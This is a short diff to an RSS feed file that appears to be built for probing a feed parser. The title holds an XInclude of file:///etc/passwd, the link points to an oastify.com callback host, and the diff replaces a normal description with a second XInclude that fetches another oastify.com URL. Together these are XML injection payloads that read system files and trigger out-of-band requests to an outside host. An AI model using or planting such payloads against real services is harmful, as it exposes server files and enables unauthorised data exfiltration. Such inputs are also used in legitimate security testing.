@@ -4,9 +4,8 @@
     <title><foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo></title>
     <link>https://caqv7dhje93k04deqspf2803lurlfi37.oastify.com</link>
-    <description><![CDATA[
-        <p>This is a &#x3c;i&#x3e;asdf&#x3c;/i&#x3e; <strong>rich HTML description</strong> with an <a href="http://example.com">external link</a>.</p>
-      ]]></description>
+    <description><foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="https://b8ks8iddgn1ajcrszrfegshpkgq7e62v.oastify.com"/></foo></description>
     <language>en-us</language>
     <pubDate>Fri, 06 Sep 2024 09:00:00 +0000</pubDate>
     <lastBuildDate>Fri, 06 Sep 2024 09:00:00 +0000</lastBuildDate>
